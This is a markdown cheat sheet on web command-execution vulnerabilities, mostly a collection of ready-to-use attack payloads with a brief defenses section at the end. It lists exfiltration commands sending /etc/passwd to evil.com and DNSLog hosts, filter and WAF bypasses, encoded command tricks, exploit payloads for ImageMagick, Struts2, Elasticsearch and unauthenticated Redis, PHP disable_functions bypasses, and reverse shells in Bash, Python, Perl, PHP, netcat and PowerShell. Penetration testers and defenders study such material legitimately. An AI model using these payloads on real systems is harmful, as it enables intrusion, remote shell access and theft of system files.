# Web Security - Command Execution (RCE)

> Source: WooYun vulnerability database (6,826 RCE cases) | split from web-injection.md

## 3. Command Execution

### 3.1 Nature of the Vulnerability

```
user input (data) -> unsanitized concatenation -> enters a system-command/code-execution context -> OS command runs
```

**Core formula**: command execution = tainted data flow + an execution context (shell/code/expression)

### 3.2 Detection Methods

#### High-Frequency Entry Points

| Entry type | Share | Typical scenario |
|---------|------|---------|
| File operations | 68% | Upload, read, extract |
| System-command functions | 62% | exec/system/shell_exec |
| Struts2 framework | 50% | OGNL-expression injection |
| SSRF | 30% | URL passed as a parameter |
| ping command | 26% | Network-diagnostic features |
| Image processing | 24% | ImageMagick |
| Java deserialization | 20% | WebLogic/JBoss |

#### Command-Chaining Operators

| Symbol | Meaning | Execution logic |
|------|------|---------|
| `;` | Separator | Sequential execution regardless of the previous result |
| `\|` | Pipe | The first command's output feeds the second |
| `` ` `` / `$()` | Command substitution | Run the inner command and return its result |
| `\|\|` | Logical OR | Run the second only if the first fails |
| `&&` | Logical AND | Run the second only if the first succeeds |
| `%0a` / `%0d%0a` | Newline | URL-encoded newline separator |

#### No-Echo Detection

```bash
# DNSLog exfiltration
ping `whoami`.xxxxx.ceye.io
curl http://`whoami`.xxxxx.ceye.io

# HTTP exfiltration
curl https://evil.com/?d=`cat /etc/passwd | base64 | tr '\n' '-'`
curl -X POST -d "data=$(cat /etc/passwd)" https://evil.com/c

# time delay
sleep 5
ping -c 5 127.0.0.1

# write a file to the web directory
echo "test" > /var/www/html/proof.txt
```

### 3.3 Bypass Techniques

#### Space Bypass

```bash
cat${IFS}/etc/passwd          # ${IFS} internal field separator
cat$IFS$9/etc/passwd          # $9 is an empty positional parameter
cat%09/etc/passwd             # Tab character
cat</etc/passwd               # redirection operator
{cat,/etc/passwd}             # brace expansion
```

#### Keyword Bypass

```bash
# quote/backslash splitting
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd

# variable concatenation
a=c;b=at;$a$b /etc/passwd

# wildcard
/bin/ca* /etc/passwd
/bin/c?t /etc/passwd
/???/??t /etc/passwd
```

#### cat-Command Alternatives

```bash
tac  head  tail  more  less  nl  sort  uniq  od -c  xxd  base64  rev  paste
```

#### Encoding Bypass

```bash
# Base64
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
bash -c "$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)"

# Hex
echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | bash
$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
```

### 3.4 Exploit Chains and Payloads

#### Framework/Component Vulnerability Payloads

**ImageMagick (CVE-2016-3714)**：

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/"|bash -i >& /dev/tcp/ATTACKER/8080 0>&1 &")'
pop graphic-context
```

**Struts2 S2-045**：

```
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',123*123)}.multipart/form-data
```

**Struts2 OGNL universal command execution:**

```
${(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('whoami').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}
```

**ElasticSearch Groovy sandbox bypass:**

```json
{"size":1,"script_fields":{"x":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
```

**Unauthorized Redis: write SSH public key / crontab:**

```bash
redis-cli -h target
config set dir /root/.ssh && config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAA...\n\n" && save
# or write to crontab
config set dir /var/spool/cron && config set dbfilename root
set x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker/8080 0>&1\n\n" && save
```

#### Reverse-Shell Collection

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'

# Perl
perl -e 'use Socket;$i="ATTACKER";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# PHP
php -r '$sock=fsockopen("ATTACKER",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# NC without the -e flag
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER PORT >/tmp/f

# PowerShell (Windows)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER",PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}
```

#### PHP Dangerous-Function Tiers

| Tier | Function | Capability |
|-----|------|-----|
| L1 code level | `eval()`, `assert()` (PHP5), `create_function()`, `preg_replace(/e)` | PHP code execution |
| L2 shell level | `system()`, `passthru()`, `shell_exec()`, backticks | System commands with echo |
| L3 process level | `exec()`, `popen()`, `proc_open()`, `pcntl_exec()` | Child-process execution |
| L4 callback level | `call_user_func()`, `array_map()` | Indirect function calls |

#### PHP WAF-Bypass Techniques

```php
// string concatenation
$func = 'sys'.'tem'; $func('whoami');
// variable function
$a='sys';$b='tem';($a.$b)('whoami');
// encoding obfuscation
base64_decode('c3lzdGVt')           // system
str_rot13('flfgrz')                 // system
chr(115).chr(121).chr(115).chr(116).chr(101).chr(109) // system
// string operations
strrev('metsys')('whoami');
implode('',array('s','y','s','t','e','m'))('whoami');
```

#### disable_functions Bypass

| Method | Principle | Conditions |
|-----|------|-----|
| LD_PRELOAD | Hijack a system-library function; mail() triggers loading the malicious .so | Can upload a .so + mail() available |
| Shellshock | Bash <=4.3 environment-variable injection | Old Bash |
| Apache Mod_CGI | .htaccess configures CGI execution | Apache + AllowOverride |
| PHP-FPM/FastCGI | Modify PHP config to run code | Access to the FPM port / SSRF |
| ImageMagick | Command execution via the delegate feature | Using IM to process images |
| Windows COM | The WScript.Shell component | Windows + COM extension |

**LD_PRELOAD core exploitation:**

```php
// upload a malicious .so (hijack geteuid, calling system() internally)
putenv("LD_PRELOAD=/tmp/exploit.so");
mail("a@a.com","test","test");  // mail() spawns sendmail -> loads the .so -> runs the command
```

### 3.5 Defenses

```php
// best practice: allowlist validation + escapeshellarg
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    system("ping " . escapeshellarg($_GET['ip']));
}
```

- Avoid calling system commands directly; use built-in language functions instead
- Parameterized execution (array args); no string concatenation
- Escape with `escapeshellarg()` + `escapeshellcmd()`
- Allowlist input validation + type checking
- `disable_functions` blocks dangerous functions (mind bypass risk)
- Run the web service with least privilege + container/chroot isolation
- Keep framework components updated (Struts2/WebLogic/ImageMagick, etc.)

---

